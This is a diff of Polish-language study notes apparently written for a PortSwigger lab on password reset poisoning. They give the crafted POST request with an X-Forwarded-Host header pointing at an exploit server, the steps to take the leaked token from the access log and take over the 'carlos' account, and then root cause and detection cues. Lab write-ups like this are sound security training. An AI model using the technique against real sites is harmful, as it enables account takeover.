@@ -5,120 +5,182 @@ Utworzono: 2026-04-22 18:05 (Europe/Amsterdam)
 
 ---
 
-## 1. SCAN (Entry & Signals)
-Endpoint:
-- POST /forgot-password
+1. SCAN (Entry & Signals)
 
-Controllable input:
-- headers (X-Forwarded-Host / Host / X-Host)
-- username
+   Endpoint:
+   - POST /forgot-password
 
-Signals:
-- reset password flow
-- token w URL (temp-forgot-password-token)
-- link wysyłany do usera (email client)
-- aplikacja za proxy (forwarded headers obecne)
+   Controllable input:
+   - X-Forwarded-Host
+   - Host / X-Host
+   - username
 
----
-
-## 2. LOCK (Vector)
-Vector:
-- X-Forwarded-Host
-
-Why this:
-- backend używa headera do budowy absolutnego URL
+   Signals:
+   - reset password flow
+   - token w URL:
+     - /forgot-password?temp-forgot-password-token=XYZ
+   - email z linkiem resetu
+   - obecność forwarded headers (proxy / middleware)
 
 ---
 
-## 3. PRESS (Exact Steps)
-1. Otwórz forgot password
-2. Wpisz: carlos
-3. Przechwyć request i dodaj header
+2. LOCK (Vector)
 
-Payload / request:
-POST /forgot-password HTTP/2
-Host: <lab-id>.web-security-academy.net
-X-Forwarded-Host: <exploit-id>.exploit-server.net
-Content-Type: application/x-www-form-urlencoded
+   Vector:
+   - X-Forwarded-Host
 
-username=carlos
+   Why this:
+   - backend używa headera do budowy absolutnego URL
 
 ---
 
-## 4. BREAK (Proof)
-- Email zawiera link do exploit-server (nie do laba)
-LUB
-- request ofiary trafia do exploit server (Access log)
+3. PRESS (Exact Steps)
 
-Dowód:
-GET /forgot-password?temp-forgot-password-token=XYZ
+   Step 1 – Trigger reset
 
----
+   - przejdź do /forgot-password
+   - podaj:
+     - username: carlos
 
-## 5. POST (Exploit Path)
-1. Wejdź w Exploit server → Access log
-2. Skopiuj token z requesta
-3. Otwórz:
-   /forgot-password?temp-forgot-password-token=XYZ na labie
-4. Ustaw nowe hasło dla carlos
-5. Login → takeover
+   Step 2 – Modyfikacja requestu
 
-Final effect:
-- account takeover (carlos)
+   Dodaj header:
+   X-Forwarded-Host: <exploit-id>.exploit-server.net
 
----
+   Final request:
 
-## 6. ROOT CAUSE
-- backend buduje URL z:
-  X-Forwarded-Host / Host
-- brak walidacji hosta
+   POST /forgot-password HTTP/2
+   Host: <lab-id>.web-security-academy.net
+   X-Forwarded-Host: <exploit-id>.exploit-server.net
+   Content-Type: application/x-www-form-urlencoded
 
-Trust break:
-- user-controlled header → security-sensitive URL
+   username=carlos
 
 ---
 
-## 7. PATTERN (Reusable)
-Name:
-- Password reset poisoning / Host header injection
+4. BREAK (Proof)
 
-Conditions:
-- token w URL
-- link wysyłany userowi
-- URL budowany dynamicznie z requesta
-- brak whitelisty hosta
+   Oczekiwane:
 
----
+   - link resetu wskazuje na:
+     - exploit-server (nie lab)
 
-## 8. PITFALLS (My mistakes)
-- skupienie na emailu zamiast URL
-- użycie złego usera (wiener zamiast carlos)
-- patrzenie na response zamiast mail/logów
-- mylenie /email endpoint z mechanizmem resetu
+   LUB
+
+   - request ofiary pojawia się w Access log:
+
+     GET /forgot-password?temp-forgot-password-token=XYZ
 
 ---
 
-## 9. DETECTION (Fast trigger)
-Scan cues:
-- reset / activation / login link
-- absolutne URL w mailach
-- obecność forwarded headers
+5. POST (Exploit Path)
 
-Szybkie testy:
-- dodaj X-Forwarded-Host → sprawdź gdzie prowadzi link
-- sprawdź exploit server logi
+   Step 1 – Pobranie tokena
+
+   - Exploit server → Access log
+   - znajdź:
+     - temp-forgot-password-token=XYZ
+
+   Step 2 – Użycie tokena
+
+   - otwórz:
+     - /forgot-password?temp-forgot-password-token=XYZ (na labie)
+
+   Step 3 – Reset
+
+   - ustaw nowe hasło dla:
+     - carlos
+
+   Step 4 – Login
+
+   - zaloguj się jako carlos
+
+   ➜ LAB SOLVED
 
 ---
 
-## 10. REPLAY (🔥)
-1. znajdź /forgot-password
-2. wyślij dla carlos
-3. dodaj X-Forwarded-Host: exploit-server
-4. sprawdź access log → token
-5. użyj tokena → reset → login
+6. ROOT CAUSE
+
+   Backend:
+
+   - buduje URL na podstawie:
+     - X-Forwarded-Host / Host
+
+   Problem:
+
+   - brak walidacji hosta
+   - zaufanie do user-controlled danych
+
+   Trust break:
+
+   - user input → security-sensitive URL
 
 ---
 
-## 11. TAKEAWAY
-Aplikacja wysyła token resetu na domenę kontrolowaną przez atakującego przez zaufanie do headerów.
+7. PATTERN (Reusable)
+
+   Name:
+   - Password reset poisoning
+   - Host header injection
+
+   Conditions:
+   - token w URL
+   - link wysyłany do usera
+   - absolutny URL budowany dynamicznie
+   - brak whitelisty hosta
+
+---
+
+8. PITFALLS (My mistakes)
+
+   - skupienie na emailu zamiast URL
+   - użycie:
+     - wiener zamiast carlos
+   - patrzenie na response zamiast:
+     - email / access log
+   - mylenie /email endpoint z reset flow
+
+---
+
+9. DETECTION (Fast trigger)
+
+   Sygnały:
+
+   - reset / activation / magic link
+   - token w URL
+   - absolutne linki w mailach
+   - forwarded headers
+
+   Testy:
+
+   - dodaj:
+     - X-Forwarded-Host
+   - sprawdź:
+     - gdzie prowadzi link
+     - czy token trafia do logów
+
+---
+
+10. REPLAY (🔥 EXEC)
+
+   1. znajdź:
+      - /forgot-password
+
+   2. wyślij:
+      - username=carlos
+
+   3. dodaj:
+      - X-Forwarded-Host: exploit-server
+
+   4. sprawdź:
+      - Access log → token
+
+   5. użyj:
+      - token → reset → login
+
+---
+
+11. TAKEAWAY
+
+   Aplikacja wysyła token resetu na domenę atakującego przez zaufanie do headerów.
 ```
